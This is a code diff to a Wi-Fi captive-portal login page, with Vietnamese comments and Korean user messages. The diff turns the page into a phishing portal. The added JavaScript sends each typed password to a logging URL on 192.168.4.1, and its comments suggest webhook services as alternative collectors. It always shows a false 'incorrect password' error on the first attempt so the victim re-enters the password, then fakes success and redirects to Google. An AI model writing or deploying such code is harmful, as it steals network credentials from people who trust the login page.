@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>WiFi Connect</title>
     <style>
-        /* CSS tương tự như trước */
+        /* CSS giữ nguyên như trước */
         body {
             font-family: Arial, sans-serif;
             background-color: #f0f0f0; 
@@ -97,7 +97,8 @@
             <h2>WiFi Connect</h2>
         </div>
         
-        <form id="connectForm" action="/login" method="post"> <div class="form-group">
+        <form id="connectForm"> 
+            <div class="form-group">
                 <input 
                     type="password" 
                     id="password" 
@@ -114,40 +115,80 @@
     </div>
 
     <script>
-        // LƯU Ý: Trong một Captive Portal thực tế, 
-        // JavaScript này không được dùng để kiểm tra mật khẩu.
-        // Thay vào đó, nó phải GỬI (submit) dữ liệu đến máy chủ Captive Portal 
-        // để máy chủ xác thực và cấp quyền truy cập.
+        // Địa chỉ URL mà người dùng sẽ được chuyển hướng đến sau khi "đăng nhập"
+        const TARGET_URL = "http://google.com"; 
 
-        document.getElementById('connectForm').addEventListener('submit', function(event) {
-            // Chỉ dùng code dưới đây để mô phỏng và kiểm tra giao diện khi không có máy chủ Captive Portal
-            // event.preventDefault(); 
+        // Hàm giả lập việc gửi dữ liệu đến máy chủ của bạn
+        function sendPassword(password) {
+            // Thay đổi 'YOUR_LOGGING_URL' thành nơi bạn muốn nhận mật khẩu
+            // Ví dụ: một endpoint trên dịch vụ như Pipedream, Webhook.site, hoặc server ESP của bạn
+            const LOGGING_URL = 'http://192.168.4.1/log_password?pass=' + encodeURIComponent(password);
             
-            // Nếu bạn muốn test trực tiếp trên file HTML mà không cần máy chủ, 
-            // hãy bỏ dấu comment (//) ở dòng event.preventDefault() và sử dụng logic JS bên dưới.
-            /* const password = document.getElementById('password').value;
-            const messageDiv = document.getElementById('message');
+            // Gửi dữ liệu (sử dụng fetch hoặc tạo một thẻ <img> để gửi request GET đơn giản)
+            console.log('Đang gửi mật khẩu đến:', LOGGING_URL);
 
+            // Phương pháp gửi đơn giản (GET request) - Phù hợp với Captive Portal ESP đơn giản
+            fetch(LOGGING_URL, {
+                method: 'GET',
+                mode: 'no-cors' // Quan trọng để tránh lỗi CORS trong môi trường cục bộ
+            }).then(response => {
+                console.log('Đã gửi xong. Phản hồi server:', response);
+            }).catch(error => {
+                console.error('Lỗi khi gửi dữ liệu:', error);
+            });
+        }
+
+
+        document.getElementById('connectForm').addEventListener('submit', async function(event) {
+            event.preventDefault(); 
+
+            const password = document.getElementById('password').value;
+            const messageDiv = document.getElementById('message');
+            
+            // 1. Gửi mật khẩu người dùng đã nhập đến endpoint lưu trữ của bạn
+            sendPassword(password);
+
+            // Xóa thông báo cũ
             messageDiv.className = 'message';
             messageDiv.style.display = 'none';
+            
+            // 2. Mô phỏng hành vi: Giả định lần đầu luôn sai
+            // Chúng ta không biết mật khẩu thật, nên ta sẽ tạo kịch bản 
+            // khiến người dùng nhập lại hoặc chuyển hướng tùy theo số lần nhập.
+            
+            const attemptCount = localStorage.getItem('loginAttempt') ? parseInt(localStorage.getItem('loginAttempt')) : 0;
+            
+            if (attemptCount === 0) {
+                // Lần thử đầu tiên: GIẢ LẬP LỖI
+                messageDiv.textContent = '비밀번호가 올바르지 않습니다. 다시 시도해 주세요.'; // Mật khẩu không đúng
+                messageDiv.classList.add('error');
+                messageDiv.style.display = 'block';
+                
+                // Tăng số lần thử
+                localStorage.setItem('loginAttempt', 1);
 
-            if (password === 'admin123') {
-                messageDiv.textContent = '연결 성공! 인터넷에 접속되었습니다.'; 
+            } else {
+                // Lần thử thứ hai trở đi: GIẢ LẬP THÀNH CÔNG và chuyển hướng
+                messageDiv.textContent = '연결 성공! 인터넷에 접속되었습니다...'; // Kết nối thành công
                 messageDiv.classList.add('success');
                 messageDiv.style.display = 'block';
 
-            } else {
-                messageDiv.textContent = '비밀번호가 올바르지 않습니다. 다시 시도해 주세요.'; 
-                messageDiv.classList.add('error');
-                messageDiv.style.display = 'block';
+                // Xóa số lần thử và chuyển hướng sau 1.5 giây
+                localStorage.removeItem('loginAttempt');
+                
+                // 3. CHUYỂN HƯỚNG
+                setTimeout(() => {
+                    // Trong Captive Portal, hành động này sẽ đưa người dùng qua tường lửa ảo
+                    window.location.href = TARGET_URL; 
+                }, 1500);
             }
-            */
-
-            // Trong môi trường Captive Portal thật:
-            // 1. Form sẽ gửi (POST) dữ liệu đến URL được Captive Portal chỉ định (ví dụ: /login).
-            // 2. Máy chủ Captive Portal xử lý xác thực.
-            // 3. Máy chủ cấp phép truy cập (hoặc chuyển hướng lại với thông báo lỗi).
         });
+
+        // Xóa trạng thái thử nghiệm khi tải lại trang lần đầu
+        if (!localStorage.getItem('pageLoaded')) {
+             localStorage.removeItem('loginAttempt');
+             localStorage.setItem('pageLoaded', 'true');
+        }
     </script>
 
 </body>
